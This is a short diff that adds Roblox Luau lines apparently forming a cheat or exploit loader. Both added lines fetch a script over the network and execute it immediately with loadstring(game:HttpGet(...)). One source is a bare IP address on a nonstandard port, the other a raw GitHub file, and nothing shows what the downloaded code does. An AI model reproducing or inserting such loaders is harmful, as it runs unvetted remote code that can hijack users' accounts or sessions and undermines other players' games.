@@ -1,0 +1,4 @@
+ID="241acbad-130b-4cd1-a253-5236091d4b84";
+loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Moonestr/adoptm/refs/heads/main/m2'))()
